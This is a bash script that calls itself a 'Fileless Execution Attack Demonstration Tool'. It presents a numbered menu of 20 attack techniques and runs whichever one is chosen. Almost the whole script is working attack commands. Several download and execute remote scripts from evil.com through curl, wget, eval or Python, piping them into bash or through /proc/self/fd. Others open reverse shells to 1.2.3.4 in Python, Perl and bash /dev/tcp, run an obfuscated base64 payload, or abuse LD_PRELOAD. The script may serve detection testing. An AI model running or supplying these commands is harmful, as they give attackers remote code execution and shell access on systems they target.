#!/bin/bash

# === Big Colored Title ===
echo -e "\e[1;31m"
echo "███████╗██╗██╗     ███████╗███████╗███████╗███████╗"
echo "██╔════╝██║██║     ██╔════╝██╔════╝██╔════╝██╔════╝"
echo "███████╗██║██║     █████╗  ███████╗█████╗  ███████╗"
echo "╚════██║██║██║     ██╔══╝  ╚════██║██╔══╝  ╚════██║"
echo "███████║██║███████╗███████╗███████║███████╗███████║"
echo "╚══════╝╚═╝╚══════╝╚══════╝╚══════╝╚══════╝╚══════╝"
echo -e "\e[0m"
echo -e "\e[1;32m        Fileless Execution Attack Demonstration Tool\e[0m"
echo

# === Menu Options ===
options=(
  "Python urllib + /proc/self/fd"
  "Curl to /proc/self/fd"
  "Wget to /proc/self/fd"
  "Base64 decode payload"
  "Obfuscated Python memory exec"
  "Python reverse shell"
  "Perl reverse shell"
  "Heredoc with exec"
  "bash -c into FD"
  "bash /dev/tcp reverse shell"
  "Curl | sh"
  "Python subprocess curl"
  "bash -c curl wrapper"
  "sh -i with FD"
  "LD_PRELOAD abuse"
  "Eval + curl"
  "Python os.system curl"
  "curl to /dev/fd"
  "systemd --deserialize"
  "runc into /proc/self/fd"
)

# === Show Menu ===
PS3=$'\n'"Choose an attack to execute (or press Ctrl+C to quit): "
select opt in "${options[@]}"; do
  case $REPLY in
    1)  exec 3< <(python3 -c "import urllib.request;print(urllib.request.urlopen('http://evil.com/payload.sh').read().decode())"); bash /proc/self/fd/3 ;;
    2)  exec 4< <(curl -s http://evil.com/payload.sh); bash /proc/self/fd/4 ;;
    3)  exec 5< <(wget -qO- http://evil.com/payload.sh); bash /proc/self/fd/5 ;;
    4)  exec 6< <(echo 'ZWNobyBldmls' | base64 -d); bash /proc/self/fd/6 ;;
    5)  exec 7< <(python3 -c "import base64;exec(base64.b64decode('aW1wb3J0IG9zO29zLnN5c3RlbSgna3VuYWwgLXh8fGVjaG8gdml2Jyk='))"); bash /proc/self/fd/7 ;;
    6)  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("1.2.3.4",1234));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];os.execve("/bin/sh",["sh"],os.environ)' ;;
    7)  perl -e 'use Socket;$i="1.2.3.4";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' ;;
    8)  exec 8< <(cat <<EOF
#!/bin/bash
echo "malicious"
EOF
); bash /proc/self/fd/8 ;;
    9)  exec 9< <(bash -c 'echo pwnd'); bash /proc/self/fd/9 ;;
    10) bash -c 'exec 3<>/dev/tcp/1.2.3.4/4444;cat <&3 | while read line; do $line 2>&3 >&3; done' ;;
    11) curl http://evil.com/payload.sh | sh ;;
    12) python3 -c "import subprocess; subprocess.run('curl http://evil.com/payload.sh | bash', shell=True)" ;;
    13) bash -c "$(curl -s http://evil.com/payload.sh)" ;;
    14) exec 10< <(sh -i); /proc/self/fd/10 ;;
    15) export LD_PRELOAD=/proc/self/fd/11; exec 11< <(echo MALICIOUS) ;;
    16) bash -c "eval \$(curl -s http://evil.com/evil.sh)" ;;
    17) exec 12< <(python3 -c "import os;os.system('curl http://evil.com | bash')"); bash /proc/self/fd/12 ;;
    18) curl -s http://evil.com/payload.sh > /dev/fd/13; bash < /dev/fd/13 ;;
    19) /usr/lib/systemd/systemd-executor --deserialize 123 ;;
    20) exec 14< <(/usr/bin/runc run malicious); bash /proc/self/fd/14 ;;
    *) echo -e "\e[1;31mInvalid option\e[0m";;
  esac
  break
done
